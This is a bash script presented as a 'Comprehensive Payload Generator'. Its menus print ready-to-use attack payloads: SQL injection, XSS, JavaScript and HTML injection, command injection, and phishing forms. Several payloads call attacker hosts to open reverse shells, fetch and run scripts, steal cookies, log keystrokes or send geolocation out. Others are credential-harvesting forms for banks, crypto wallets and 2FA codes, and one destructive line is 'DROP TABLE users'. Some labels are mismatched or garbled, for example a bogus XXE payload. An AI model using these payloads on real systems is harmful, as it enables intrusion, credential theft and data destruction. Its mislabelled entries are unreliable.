#!/bin/bash

# Function to display payload and description with colors
display_payload() {
    payload="$1"
    description="$2"
    echo -e "\e[34mPayload:\e[0m"
    echo -e "\e[36m$payload\e[0m"
    echo -e "\e[34mDescription:\e[0m \e[37m$description\e[0m"
    echo ""
}

# Function for each payload category

# SQL Injection Payloads
sql_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Classic SQL Injection (OR condition)\e[0m"
        echo -e "\e[33m2) Error-based SQL Injection (Union Select)\e[0m"
        echo -e "\e[33m3) Union-based SQL Injection (Column-based)\e[0m"
        echo -e "\e[33m4) Blind SQL Injection (Boolean-based)\e[0m"
        echo -e "\e[33m5) Blind SQL Injection (Time-based)\e[0m"
        echo -e "\e[33m6) Second-order SQL Injection\e[0m"
        echo -e "\e[33m7) Out-of-Band SQL Injection (Load File)\e[0m"
        echo -e "\e[33m8) SQL Injection (Subselect Injection)\e[0m"
        echo -e "\e[33m9) Stacked Queries SQL Injection (Multiple Queries)\e[0m"
        echo -e "\e[33m10) Error-based SQL Injection with Delay\e[0m"
        echo -e "\e[33m11) Time-based Blind with Random Delay\e[0m"
        echo -e "\e[33m12) SQL Injection with DNS Exfiltration\e[0m"
        echo -e "\e[33m13) SQL Injection with Email Exfiltration\e[0m"
        echo -e "\e[33m14) SQL Injection with OS Command Execution (Windows)\e[0m"
        echo -e "\e[33m15) SQL Injection with OS Command Execution (Linux)\e[0m"
        echo -e "\e[33m16) SQL Injection with XML External Entity (XXE)\e[0m"
        echo -e "\e[33m17) SQL Injection with XPath Injection\e[0m"
        echo -e "\e[33m18) SQL Injection with HTTP Response Splitting\e[0m"
        echo -e "\e[33m19) SQL Injection with File Inclusion (Local)\e[0m"
        echo -e "\e[33m20) SQL Injection with File Inclusion (Remote)\e[0m"
        echo -e "\e[33m21) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "' OR 1=1--" "Classic SQL Injection (OR condition)";;
            2) display_payload "' AND 1=1 GROUP BY column_name HAVING 1=1--" "Error-based SQL Injection (Union Select)";;
            3) display_payload "' UNION SELECT username, password FROM users--" "Union-based SQL Injection (Column-based)";;
            4) display_payload "' AND '1'='1" "Blind SQL Injection (Boolean-based)";;
            5) display_payload "' OR IF(1=1,SLEEP(5),0)--" "Blind SQL Injection (Time-based)";;
            6) display_payload "' OR EXISTS(SELECT * FROM users WHERE username='admin')--" "Second-order SQL Injection";;
            7) display_payload "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--" "Out-of-Band SQL Injection (Load File)";;
            8) display_payload "' AND (SELECT COUNT(*) FROM users) > 0 --" "SQL Injection (Subselect Injection)";;
            9) display_payload "'; DROP TABLE users;--" "Stacked Queries SQL Injection (Multiple Queries)";;
            10) display_payload "' AND 1=1 AND SLEEP(5)--" "Error-based SQL Injection with Delay";;
            11) display_payload "' OR IF(1=1,SLEEP(RAND() % 10),0)--" "Time-based Blind with Random Delay";;
            12) display_payload "'; EXEC xp_cmdshell('nslookup example.com')--" "SQL Injection with DNS Exfiltration";;
            13) display_payload "'; EXEC xp_cmdshell('echo user@example.com > /tmp/emails.txt')--" "SQL Injection with Email Exfiltration";;
            14) display_payload "'; EXEC xp_cmdshell('whoami')--" "SQL Injection with OS Command Execution (Windows)";;
            15) display_payload "'; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1 --" "SQL Injection with OS Command Execution (Linux)";;
            16) display_payload "'; DROP XML DATASET --" "SQL Injection with XML External Entity (XXE)";;
            17) display_payload "'; /* XPath Injection: XPath query bypass */ /bookstore/book/title[text()='admin'] --" "SQL Injection with XPath Injection";;
            18) display_payload "'; HTTP/1.1 302 Found Location: http://attacker.com --" "SQL Injection with HTTP Response Splitting";;
            19) display_payload "' UNION SELECT 1, LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--" "SQL Injection with File Inclusion (Local)";;
            20) display_payload "' UNION SELECT 1, LOAD_FILE('http://malicious.com/shell.txt')--" "SQL Injection with File Inclusion (Remote)";;
            21) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# XSS Payloads
xss_payloads() {
    while true; do
        echo -e "\e[33m1) Basic JavaScript Injection\e[0m"
        echo -e "\e[33m2) HTML Tag Injection\e[0m"
        echo -e "\e[33m3) Event Handler Injection\e[0m"
        echo -e "\e[33m4) Polyglot Payloads\e[0m"
        echo -e "\e[33m5) DOM-based XSS\e[0m"
        echo -e "\e[33m6) URL-based XSS (JavaScript URL)\e[0m"
        echo -e "\e[33m7) Self XSS (Injected into browser console)\e[0m"
        echo -e "\e[33m8) SVG-based XSS (Scalable Vector Graphics)\e[0m"
        echo -e "\e[33m9) Base64 Encoded XSS\e[0m"
        echo -e "\e[33m10) XMLHttpRequest XSS (AJAX-based)\e[0m"
        echo -e "\e[33m11) JavaScript URL Injection (Location)\e[0m"
        echo -e "\e[33m12) WebSocket XSS (WebSocket-based)\e[0m"
        echo -e "\e[33m13) Cookie-based XSS (Steal Cookies)\e[0m"
        echo -e "\e[33m14) Reflected XSS (GET parameter exploitation)\e[0m"
        echo -e "\e[33m15) DOM Clobbering (XSS by manipulating DOM)\e[0m"
        echo -e "\e[33m16) HTTP Response Splitting (XSS-based)\e[0m"
        echo -e "\e[33m17) Blind XSS (Injected in user profile, etc.)\e[0m"
        echo -e "\e[33m18) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>alert('XSS')</script>" "Basic JavaScript Injection";;
            2) display_payload "<img src='x' onerror='alert(\"XSS\")'>" "HTML Tag Injection";;
            3) display_payload "<input type='button' value='Click Me' onclick='alert(\"XSS\")'>" "Event Handler Injection";;
            4) display_payload "\"><script>alert('XSS')</script>" "Polyglot Payloads";;
            5) display_payload "<script>document.getElementById('id').innerHTML='Hacked!';</script>" "DOM-based XSS";;
            6) display_payload "javascript:alert('XSS')" "URL-based XSS (JavaScript URL)";;
            7) display_payload "<script>console.log('XSS: Injected via console')</script>" "Self XSS (Injected into browser console)";;
            8) display_payload "<svg/onload=alert('XSS')>" "SVG-based XSS";;
            9) display_payload "<script>eval(atob('YWxlcnQoIkhha2VkISIp'))</script>" "Base64 Encoded XSS";;
            10) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/malicious', true); xhr.send();</script>" "XMLHttpRequest XSS (AJAX-based)";;
            11) display_payload "<a href='javascript:alert(\"XSS\")'>Click me</a>" "JavaScript URL Injection (Location)";;
            12) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onmessage = function(event) { alert('XSS: ' + event.data); }</script>" "WebSocket XSS (WebSocket-based)";;
            13) display_payload "<script>document.cookie='user=attacker'; alert(document.cookie)</script>" "Cookie-based XSS (Steal Cookies)";;
            14) display_payload "<script>window.location='http://attacker.com?param=' + document.cookie;</script>" "Reflected XSS (GET parameter exploitation)";;
            15) display_payload "<script>var el = document.createElement('input'); el.setAttribute('value', 'XSS'); document.body.appendChild(el);</script>" "DOM Clobbering (XSS by manipulating DOM)";;
            16) display_payload "<script>document.write('<img src=\"http://attacker.com/malicious?cookie=' + document.cookie + '\" />');</script>" "HTTP Response Splitting (XSS-based)";;
            17) display_payload "<script>setTimeout(() => { alert('XSS from user profile!'); }, 1000);</script>" "Blind XSS (Injected in user profile, etc.)";;
            18) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# JavaScript Injection Payloads
javascript_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Basic JavaScript Injection\e[0m"
        echo -e "\e[33m2) Window.location Injection\e[0m"
        echo -e "\e[33m3) Document.write Injection\e[0m"
        echo -e "\e[33m4) Eval Injection\e[0m"
        echo -e "\e[33m5) Instant Redirect using window.location\e[0m"
        echo -e "\e[33m6) Instant Redirect using setTimeout (No Delay)\e[0m"
        echo -e "\e[33m7) Redirect with alert before redirecting instantly\e[0m"
        echo -e "\e[33m8) Instant Redirect using meta tag\e[0m"
        echo -e "\e[33m9) Steal Cookies with JavaScript Injection\e[0m"
        echo -e "\e[33m10) JavaScript Keylogger Injection\e[0m"
        echo -e "\e[33m11) DOM Manipulation Injection (Inject malicious content into the page)\e[0m"
        echo -e "\e[33m12) Cross-Site WebSocket Injection\e[0m"
        echo -e "\e[33m13) Cross-Site XMLHttpRequest Injection\e[0m"
        echo -e "\e[33m14) Geolocation Spoofing with JavaScript\e[0m"
        echo -e "\e[33m15) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>alert('XSS')</script>" "Basic JavaScript Injection";;
            2) display_payload "<script>window.location='http://attacker.com';</script>" "Instant Redirect using window.location";
            # **Explanation**: This payload instantly redirects the user to a malicious site using `window.location` without any delay.
            ;;
            3) display_payload "<script>document.write('<h1>Hacked</h1>');</script>" "Document.write Injection";;
            4) display_payload "<script>eval('alert(1)');</script>" "Eval Injection";;
            5) display_payload "<script>window.location='http://attacker.com';</script>" "Instant Redirect using window.location";
            # **Explanation**: Instant redirection using `window.location`. The page is redirected immediately.
            ;;
            6) display_payload "<script>setTimeout(function(){ window.location.href='http://attacker.com'; }, 0);</script>" "Instant Redirect using setTimeout (No Delay)";
            # **Explanation**: This payload redirects the user immediately with `setTimeout` using `0` milliseconds, effectively no delay.
            ;;
            7) display_payload "<script>setTimeout(function(){ alert('Redirecting to attacker site'); window.location='http://attacker.com'; }, 0);</script>" "Redirect with alert before redirecting instantly";
            # **Explanation**: This payload triggers an alert immediately (without delay) and then redirects the user instantly.
            ;;
            8) display_payload "<meta http-equiv='refresh' content='0;url=http://attacker.com'>" "Instant Redirect using meta tag";
            # **Explanation**: This uses the `<meta>` tag to refresh and redirect immediately to the malicious URL.
            ;;
            9) display_payload "<script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>" "Steal Cookies with JavaScript Injection";;
            10) display_payload "<script>document.onkeydown = function(e) { var key = e.key; var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com/keylogger', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('key=' + key); }</script>" "JavaScript Keylogger Injection";;
            11) display_payload "<script>document.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;background-color:red;color:white;text-align:center;\">Hacked!</div>';</script>" "DOM Manipulation Injection (Inject malicious content into the page)";;
            12) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onmessage = function(event) { alert('XSS: ' + event.data); }</script>" "Cross-Site WebSocket Injection";;
            13) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/malicious', true); xhr.send();</script>" "Cross-Site XMLHttpRequest Injection";;
            14) display_payload "<script>navigator.geolocation.getCurrentPosition(function(position) { var lat = position.coords.latitude; var lon = position.coords.longitude; var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com/geolocation', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('lat=' + lat + '&lon=' + lon); });</script>" "Geolocation Spoofing with JavaScript";;
            15) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# HTML Injection Payloads
html_injection_payloads() {
    while true; do
        echo -e "\e[33m1) HTML Tag Injection\e[0m"
        echo -e "\e[33m2) HTML Comment Injection\e[0m"
        echo -e "\e[33m3) HTML Attribute Injection (Image onerror)\e[0m"
        echo -e "\e[33m4) HTML Form Injection\e[0m"
        echo -e "\e[33m5) HTML Script Injection\e[0m"
        echo -e "\e[33m6) HTML JavaScript Injection (alert)\e[0m"
        echo -e "\e[33m7) HTML Image Source Injection\e[0m"
        echo -e "\e[33m8) HTML Script Location Injection (XSS)\e[0m"
        echo -e "\e[33m9) HTML Data Injection via Forms\e[0m"
        echo -e "\e[33m10) HTML Iframe Injection (malicious iframe)\e[0m"
        echo -e "\e[33m11) HTML Event Injection (onclick, onmouseover, etc.)\e[0m"
        echo -e "\e[33m12) HTML Meta Tag Injection (XSS via meta)\e[0m"
        echo -e "\e[33m13) HTML Base Tag Injection (Redirect)\e[0m"
        echo -e "\e[33m14) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<h1>Hacked!</h1>" "HTML Tag Injection";;
            2) display_payload "<!-- Comment Hack -->" "HTML Comment Injection";;
            3) display_payload "<img src='x' onerror='alert(1)' />" "HTML Attribute Injection (Image onerror)";;
            4) display_payload "<form action='http://evil.com/steal_data' method='POST'><input type='text' name='user_data' /><input type='submit' /></form>" "HTML Form Injection";;
            5) display_payload "<script>alert('Hacked!');</script>" "HTML Script Injection";;
            6) display_payload "<script>alert('XSS via script');</script>" "HTML JavaScript Injection (alert)";;
            7) display_payload "<img src='http://evil.com/malicious_image.jpg' />" "HTML Image Source Injection";;
            8) display_payload "<script src='http://evil.com/malicious_script.js'></script>" "HTML Script Location Injection (XSS)";;
            9) display_payload "<form action='http://evil.com/steal_data' method='POST'><input type='text' name='user_data' value='stolen_data'/><input type='submit' /></form>" "HTML Data Injection via Forms";;
            10) display_payload "<iframe src='http://evil.com' width='600' height='400'></iframe>" "HTML Iframe Injection (malicious iframe)";;
            11) display_payload "<button onclick='alert(1)'>Click Me</button>" "HTML Event Injection (onclick)";;
            12) display_payload "<meta http-equiv='refresh' content='0; url=http://evil.com' />" "HTML Meta Tag Injection (XSS via meta)";;
            13) display_payload "<base href='http://evil.com/' />" "HTML Base Tag Injection (Redirect)";;
            14) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Phishing Payloads
phishing_payloads() {
    while true; do
        echo -e "\e[33m1) Custom Phishing Form with Injected JavaScript\e[0m"  # New option moved to 1
        echo -e "\e[33m2) Fake Admin Panels\e[0m"
        echo -e "\e[33m3) Fake Credit Card Forms\e[0m"
        echo -e "\e[33m4) Fake Two-Factor Authentication Pages\e[0m"
        echo -e "\e[33m5) Fake Account Recovery Forms\e[0m"
        echo -e "\e[33m6) Fake Social Media Login Pages\e[0m"
        echo -e "\e[33m7) Fake Email Login Pages\e[0m"
        echo -e "\e[33m8) Fake Payment Gateway Forms\e[0m"
        echo -e "\e[33m9) Fake Software Update Pages\e[0m"
        echo -e "\e[33m10) Fake Bank Login Pages\e[0m"
        echo -e "\e[33m11) Fake Cloud Storage Login Pages\e[0m"
        echo -e "\e[33m12) Fake DNS Server Login Page (Advanced)\e[0m"
        echo -e "\e[33m13) Fake File Sharing Login Pages\e[0m"
        echo -e "\e[33m14) Fake Wi-Fi Network Login Pages\e[0m"
        echo -e "\e[33m15) Fake VPN Login Pages\e[0m"
        echo -e "\e[33m16) Fake Webmail Login Pages\e[0m"
        echo -e "\e[33m17) Fake Online Shopping Login Pages\e[0m"
        echo -e "\e[33m18) Fake Online Game Login Pages\e[0m"
        echo -e "\e[33m19) Fake Cryptocurrency Wallet Login Pages\e[0m"
        echo -e "\e[33m20) Fake Online Banking Verification Pages\e[0m"
        echo -e "\e[33m21) Fake Video Streaming Service Login Pages\e[0m"
        echo -e "\e[33m22) Fake Mobile App Login Pages\e[0m"
        echo -e "\e[33m23) Fake File Upload Form (Malicious Upload)\e[0m"
        echo -e "\e[33m24) Fake Email Verification Pages\e[0m"
        echo -e "\e[33m25) Fake Social Media Verification Pages\e[0m"
        echo -e "\e[33m26) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>var injectedForm=\`<div style='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:700px;padding:60px;background-color:#333;color:white;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,0.7);font-family:Arial,sans-serif;font-size:18px;'><h2 style='text-align:center;margin-bottom:40px;font-size:40px;color:#4CAF50;'>Login</h2><form action='http://phishingsite.com/login' method='POST'><input type='text' name='username' placeholder='Username' style='width:100%;padding:18px;margin-bottom:25px;border-radius:8px;font-size:20px;border:2px solid #ddd;background-color:#f7f7f7;color:#333;'><input type='password' name='password' placeholder='Password' style='width:100%;padding:18px;margin-bottom:35px;border-radius:8px;font-size:20px;border:2px solid #ddd;background-color:#f7f7f7;color:#333;'><button type='submit' style='width:100%;padding:18px;background-color:#4CAF50;color:white;border:none;border-radius:8px;cursor:pointer;font-size:22px;transition:background-color 0.3s ease;'>Login</button></form></div><style>button:hover{background-color:#45a049;}input:focus{outline:none;border-color:#4CAF50;}</style>\`;document.body.innerHTML+=injectedForm;</script>" "Custom phishing form with injected JavaScript to steal login credentials. The form appears as a fixed login box in the center of the screen, mimicking a legitimate login page. When the victim enters their username and password, the data is sent to a remote server for harvesting.";;
            2) display_payload "<form action='http://phishingsite.com/admin' method='POST'><input type='text' name='admin_username' placeholder='Admin Username'><input type='password' name='admin_password' placeholder='Admin Password'><button type='submit'>Login</button></form>" "Fake Admin Panels";;
            3) display_payload "<form action='http://phishingsite.com/credit-card' method='POST'><input type='text' name='card_number' placeholder='Card Number'><input type='text' name='expiry' placeholder='Expiry Date'><input type='text' name='cvv' placeholder='CVV'><button type='submit'>Submit</button></form>" "Fake Credit Card Forms";;
            4) display_payload "<form action='http://phishingsite.com/2fa' method='POST'><input type='text' name='otp' placeholder='Enter OTP'><button type='submit'>Submit</button></form>" "Fake Two-Factor Authentication Pages";;
            5) display_payload "<form action='http://phishingsite.com/recovery' method='POST'><input type='text' name='email' placeholder='Email Address'><button type='submit'>Submit</button></form>" "Fake Account Recovery Forms";;
            6) display_payload "<form action='http://phishingsite.com/social-login' method='POST'><input type='text' name='social_username' placeholder='Social Username'><input type='password' name='social_password' placeholder='Social Password'><button type='submit'>Login</button></form>" "Fake Social Media Login Pages";;
            7) display_payload "<form action='http://phishingsite.com/email-login' method='POST'><input type='email' name='email' placeholder='Email Address'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Email Login Pages";;
            8) display_payload "<form action='http://phishingsite.com/payment' method='POST'><input type='text' name='card_number' placeholder='Card Number'><input type='text' name='expiry' placeholder='Expiry Date'><input type='text' name='cvv' placeholder='CVV'><input type='text' name='address' placeholder='Billing Address'><button type='submit'>Pay Now</button></form>" "Fake Payment Gateway Forms";;
            9) display_payload "<form action='http://phishingsite.com/update' method='POST'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Update</button></form>" "Fake Software Update Pages";;
            10) display_payload "<form action='http://phishingsite.com/bank-login' method='POST'><input type='text' name='account_number' placeholder='Account Number'><input type='password' name='pin' placeholder='PIN'><button type='submit'>Login</button></form>" "Fake Bank Login Pages";;
            11) display_payload "<form action='http://phishingsite.com/cloud-login' method='POST'><input type='text' name='cloud_username' placeholder='Username'><input type='password' name='cloud_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Cloud Storage Login Pages";;
            12) display_payload "<form action='http://phishingsite.com/dns-login' method='POST'><input type='text' name='dns_username' placeholder='DNS Username'><input type='password' name='dns_password' placeholder='DNS Password'><button type='submit'>Login</button></form>" "Fake DNS Server Login Page (Advanced)";;
            13) display_payload "<form action='http://phishingsite.com/file-login' method='POST'><input type='text' name='file_username' placeholder='Username'><input type='password' name='file_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake File Sharing Login Pages";;
            14) display_payload "<form action='http://phishingsite.com/wi-fi-login' method='POST'><input type='text' name='wifi_username' placeholder='Wi-Fi Username'><input type='password' name='wifi_password' placeholder='Wi-Fi Password'><button type='submit'>Login</button></form>" "Fake Wi-Fi Network Login Pages";;
            15) display_payload "<form action='http://phishingsite.com/vpn-login' method='POST'><input type='text' name='vpn_username' placeholder='VPN Username'><input type='password' name='vpn_password' placeholder='VPN Password'><button type='submit'>Login</button></form>" "Fake VPN Login Pages";;
            16) display_payload "<form action='http://phishingsite.com/webmail-login' method='POST'><input type='email' name='webmail_username' placeholder='Webmail Username'><input type='password' name='webmail_password' placeholder='Webmail Password'><button type='submit'>Login</button></form>" "Fake Webmail Login Pages";;
            17) display_payload "<form action='http://phishingsite.com/shopping-login' method='POST'><input type='text' name='shopping_username' placeholder='Shopping Username'><input type='password' name='shopping_password' placeholder='Shopping Password'><button type='submit'>Login</button></form>" "Fake Online Shopping Login Pages";;
            18) display_payload "<form action='http://phishingsite.com/game-login' method='POST'><input type='text' name='game_username' placeholder='Game Username'><input type='password' name='game_password' placeholder='Game Password'><button type='submit'>Login</button></form>" "Fake Online Game Login Pages";;
            19) display_payload "<form action='http://phishingsite.com/crypto-wallet-login' method='POST'><input type='text' name='crypto_wallet_username' placeholder='Crypto Wallet Username'><input type='password' name='crypto_wallet_password' placeholder='Crypto Wallet Password'><button type='submit'>Login</button></form>" "Fake Cryptocurrency Wallet Login Pages";;
            20) display_payload "<form action='http://phishingsite.com/online-banking' method='POST'><input type='text' name='bank_username' placeholder='Bank Username'><input type='password' name='bank_password' placeholder='Bank Password'><button type='submit'>Login</button></form>" "Fake Online Banking Verification Pages";;
            21) display_payload "<form action='http://phishingsite.com/video-streaming-login' method='POST'><input type='text' name='video_username' placeholder='Video Username'><input type='password' name='video_password' placeholder='Video Password'><button type='submit'>Login</button></form>" "Fake Video Streaming Service Login Pages";;
            22) display_payload "<form action='http://phishingsite.com/mobile-app-login' method='POST'><input type='text' name='app_username' placeholder='App Username'><input type='password' name='app_password' placeholder='App Password'><button type='submit'>Login</button></form>" "Fake Mobile App Login Pages";;
            23) display_payload "<form action='http://phishingsite.com/file-upload' method='POST' enctype='multipart/form-data'><input type='file' name='malicious_file'><button type='submit'>Upload File</button></form>" "Fake File Upload Form (Malicious Upload)";;
            24) display_payload "<form action='http://phishingsite.com/email-verification' method='POST'><input type='text' name='email' placeholder='Email Address'><button type='submit'>Verify Email</button></form>" "Fake Email Verification Pages";;
            25) display_payload "<form action='http://phishingsite.com/social-verification' method='POST'><input type='text' name='social_media' placeholder='Social Media Username'><button type='submit'>Verify</button></form>" "Fake Social Media Verification Pages";;
            26) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Command and System Injection Payloads
command_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Basic Command Injection\e[0m"
        echo -e "\e[33m2) OS Command Injection\e[0m"
        echo -e "\e[33m3) Reverse Shell Injection\e[0m"
        echo -e "\e[33m4) File Inclusion via Command Injection\e[0m"
        echo -e "\e[33m5) Privilege Escalation via Command Injection\e[0m"
        echo -e "\e[33m6) Command Injection via URL Redirection\e[0m"
        echo -e "\e[33m7) Command Injection in Web Application Firewall (WAF)\e[0m"
        echo -e "\e[33m8) PHP System Command Injection (eval)\e[0m"
        echo -e "\e[33m9) Python os.system() Injection\e[0m"
        echo -e "\e[33m10) System File Manipulation via Command Injection\e[0m"
        echo -e "\e[33m11) Command Injection to Upload a Malicious File\e[0m"
        echo -e "\e[33m12) Command Injection via CGI Scripts\e[0m"
        echo -e "\e[33m13) Command Injection with Sudo Privileges\e[0m"
        echo -e "\e[33m14) Command Injection via FTP Commands\e[0m"
        echo -e "\e[33m15) Command Injection via SSH Injection\e[0m"
        echo -e "\e[33m16) Command Injection via Systemd Service\e[0m"
        echo -e "\e[33m17) Command Injection to Exploit Web Shells\e[0m"
        echo -e "\e[33m18) Command Injection in Cron Jobs\e[0m"
        echo -e "\e[33m19) DNS Command Injection\e[0m"
        echo -e "\e[33m20) Local File Inclusion via Command Injection\e[0m"
        echo -e "\e[33m21) SQL Injection with Command Execution\e[0m"
        echo -e "\e[33m22) Remote File Inclusion via Command Injection\e[0m"
        echo -e "\e[33m23) Command Injection in HTTP Headers\e[0m"
        echo -e "\e[33m24) Command Injection via Flask Framework (Python)\e[0m"
        echo -e "\e[33m25) Command Injection via Node.js (child_process)\e[0m"
        echo -e "\e[33m26) Command Injection in WebSockets\e[0m"
        echo -e "\e[33m27) Exploiting Shellshock via Command Injection\e[0m"
        echo -e "\e[33m28) Command Injection via Perl Scripts\e[0m"
        echo -e "\e[33m29) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "; ls -la" "Basic Command Injection";;
            2) display_payload "& cat /etc/passwd" "OS Command Injection";;
            3) display_payload "| nc -e /bin/bash attacker.com 4444" "Reverse Shell Injection";;
            4) display_payload "; cat /etc/passwd" "File Inclusion via Command Injection";;
            5) display_payload "echo 'Test' | sudo tee /etc/sudoers" "Privilege Escalation via Command Injection";;
            6) display_payload "; curl http://attacker.com/malicious_script.sh | bash" "Command Injection via URL Redirection";;
            7) display_payload "; curl -X GET 'http://target.com/cgi-bin/system?command=ls'" "Command Injection in Web Application Firewall (WAF)";;
            8) display_payload "; php -r 'system($_GET[\"cmd\"]);'" "PHP System Command Injection (eval)";;
            9) display_payload "; python -c 'import os; os.system(\"ls -la\")'" "Python os.system() Injection";;
            10) display_payload "; echo 'malicious content' > /tmp/malicious_file" "System File Manipulation via Command Injection";;
            11) display_payload "; curl -X POST -F 'file=@malicious_script.sh' http://target.com/upload" "Command Injection to Upload a Malicious File";;
            12) display_payload "; /usr/lib/cgi-bin/test.cgi; cat /etc/passwd" "Command Injection via CGI Scripts";;
            13) display_payload "; sudo /bin/bash -i" "Command Injection with Sudo Privileges";;
            14) display_payload "; ftp -n -v -i -u attacker.com; ls" "Command Injection via FTP Commands";;
            15) display_payload "; ssh attacker@attacker.com 'ls -la'" "Command Injection via SSH Injection";;
            16) display_payload "; systemctl restart httpd" "Command Injection via Systemd Service";;
            17) display_payload "; echo 'malicious_code' > /var/www/html/shell.php" "Command Injection to Exploit Web Shells";;
            18) display_payload "; crontab -l; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'" "Command Injection in Cron Jobs";;
            19) display_payload "; nslookup attacker.com" "DNS Command Injection";;
            20) display_payload "; include('/etc/passwd');" "Local File Inclusion via Command Injection";;
            21) display_payload "; SELECT * FROM users WHERE id=1; system('ls')" "SQL Injection with Command Execution";;
            22) display_payload "; curl http://target.com/rfi?file=http://attacker.com/malicious_file" "Remote File Inclusion via Command Injection";;
            23) display_payload "; echo 'malicious_code' | nc attacker.com 4444" "Command Injection in HTTP Headers";;
            24) display_payload "; python -c 'import os; os.system(\"ls /var/www\")'" "Command Injection via Flask Framework (Python)";;
            25) display_payload "; node -e 'require(\"child_process\").exec(\"ls -la\", function(err, stdout, stderr) { console.log(stdout); })'" "Command Injection via Node.js (child_process)";;
            26) display_payload "; ws://attacker.com/socket" "Command Injection in WebSockets";;
            27) display_payload "; env x='() { :;}; echo vulnerable' bash -c 'echo hello'" "Exploiting Shellshock via Command Injection";;
            28) display_payload "; perl -e 'system(\"ls -la\")'" "Command Injection via Perl Scripts";;
            29) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Main menu
main_menu() {
    while true; do
        echo -e "\e[1;33mSelect a payload category:\e[0m"
        echo -e "1) SQL Injection Payloads"
        echo -e "2) XSS Payloads"
        echo -e "3) JavaScript Injection Payloads"
        echo -e "4) HTML Injection Payloads"
        echo -e "5) Phishing Payloads"
        echo -e "6) Command & System Injection Payloads"
        echo -e "9) Exit"
        read -p "Enter your choice: " choice

        case $choice in
            1) sql_injection_payloads;;
            2) xss_payloads;;
            3) javascript_injection_payloads;;
            4) html_injection_payloads;;
            5) phishing_payloads;;
            6) command_injection_payloads;;
            9) echo -e "\e[32mExiting... Goodbye!\e[0m"; exit 0;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Script execution
clear
echo -e "\e[1;36mWelcome to the Comprehensive Payload Generator!\e[0m"
main_menu